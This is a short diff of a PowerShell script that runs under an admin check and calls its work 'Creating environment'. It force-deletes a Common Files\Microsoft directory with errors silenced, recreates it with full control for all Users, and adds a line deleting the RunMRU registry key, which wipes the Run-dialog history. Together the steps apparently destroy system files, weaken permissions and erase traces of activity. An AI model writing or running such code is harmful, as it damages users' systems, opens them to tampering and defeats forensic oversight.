@@ -21,6 +21,7 @@ if(Test-IsAdmin) # Check privileges
 {
     echo "Creating environment";
     rm -r -fo "C:\Program Files\Common Files\Microsoft" -erroraction 'silentlycontinue';
+    Remove-Item HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 
     md "C:\Program Files\Common Files\Microsoft" >$null;
     icacls "C:\Program Files\Common Files\Microsoft" /q /c /t /grant Users:F >$null;
